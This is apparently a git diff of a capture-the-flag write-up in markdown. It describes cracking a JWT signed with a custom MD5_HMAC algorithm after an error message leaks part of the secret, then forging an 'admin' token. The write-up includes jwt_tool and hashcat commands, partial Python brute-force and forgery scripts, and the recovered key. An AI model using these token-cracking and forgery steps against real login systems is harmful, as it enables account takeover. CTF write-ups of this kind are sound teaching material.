@@ -30,20 +30,25 @@ layout:
 
 Can't register as `admin`.
 
+{% code overflow="wrap" %}
 ```bash
 Login as the admin has been disabled
 ```
+{% endcode %}
 
 Register as `cat` and it says only `admin` can get flag!
 
 Check the [JWT](https://youtu.be/GIq3naOLrTg) in session cookies.
 
+{% code overflow="wrap" %}
 ```json
 eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImNhdCJ9.C3Z8QcoVXXFa-LAzFZbZ1w
 ```
+{% endcode %}
 
 Decode it with [jwt.io](https://jwt.io)
 
+{% code overflow="wrap" %}
 ```json
 {
   "alg": "MD5_HMAC"
@@ -52,44 +57,54 @@ Decode it with [jwt.io](https://jwt.io)
   "username": "cat"
 }
 ```
+{% endcode %}
 
 ## First attempts
 
 Tried `null` and `none` algorithm attacks with `jwt_tool`.
 
+{% code overflow="wrap" %}
 ```bash
 jwt_tool eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImNhdCJ9.C3Z8QcoVXXFa-LAzFZbZ1w -X a -pc username -pv admin
 ```
+{% endcode %}
 
 When trying to use the tokens, get an error.
 
+{% code overflow="wrap" %}
 ```bash
 Invalid algorithm, we only accept tokens signed with our MD5_HMAC algorithm using the secret fsrwjcfszeg*****
 ```
+{% endcode %}
 
 So we know the first 11 characters of the key `fsrwjcfszeg`, let's try to brute force the last 5.
 
 Tried `jwt_tool` but it doesn't work with the `MD5_HMAC` algorithm.
 
+{% code overflow="wrap" %}
 ```bash
 jwt_tool eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImNhdCJ9.C3Z8QcoVXXFa-LAzFZbZ1w -C -p fsrwjcfszeg*****
 
 Algorithm is not HMAC-SHA - cannot test with this tool.
 ```
+{% endcode %}
 
 Same goes for `hashcat`.
 
+{% code overflow="wrap" %}
 ```bash
 hashcat -a 3 -m 16500 'eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImNhdCJ9.C3Z8QcoVXXFa-LAzFZbZ1w' fsrwjcfszeg?l?l?l?l?l
 
 Hash 'eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImNhdCJ9.C3Z8QcoVXXFa-LAzFZbZ1w': Token length exception
 No hashes loaded.
 ```
+{% endcode %}
 
 ## Solve script #1 (brute-force)
 
 Let's (me and chatGPT) make a custom script to crack the signature.
 
+{% code overflow="wrap" %}
 ```python
 import jwt
 import hashlib
@@ -136,17 +151,21 @@ for i in range(len(charset) ** key_length):
 
     verify_jwt(jwt_token, 'fsrwjcfszeg' + key)
 ```
+{% endcode %}
 
 Got the key!
 
+{% code overflow="wrap" %}
 ```bash
 Key: fsrwjcfszegvsyfa
 ```
+{% endcode %}
 
 ## Solve script #2 (forge token)
 
 Now another custom script to forge a token with user `admin`.
 
+{% code overflow="wrap" %}
 ```python
 import jwt
 import hashlib
@@ -192,12 +211,15 @@ modified_jwt = header + '.' + encoded_payload + '.' + encoded_signature
 
 print("Modified Token:", modified_jwt)
 ```
+{% endcode %}
 
 Receive a new token, signed with `MD5_HMAC` using the secret key `fsrwjcfszegvsyfa`.
 
+{% code overflow="wrap" %}
 ```bash
 eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.C3Z8QcoVXXFa-LAzFZbZ1w
 ```
+{% endcode %}
 
 We replace the cookie and receive a flag!
 
